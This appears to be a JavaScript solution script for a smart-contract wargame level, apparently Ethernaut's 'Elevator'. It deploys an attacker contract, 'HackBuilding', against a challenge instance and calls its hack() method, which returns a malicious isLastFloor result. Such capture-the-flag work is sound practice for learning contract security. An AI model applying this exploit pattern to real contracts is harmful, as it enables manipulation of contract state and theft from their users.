const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load attacker contract.')
    let attacker = loader.web3.fromArtifact('HackBuilding')

    console.log('Deploy attacker contract...')
    const { options: { address } } = await attacker.deploy({ arguments: [instance] }).send()

    console.log('Load deployed attacker contract.')
    attacker = loader.web3.fromArtifact('HackBuilding', address)

    console.log('Perform hack by calling malicious implementation of isLastFloor interface function...')
    await attacker.methods.hack().send()

    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
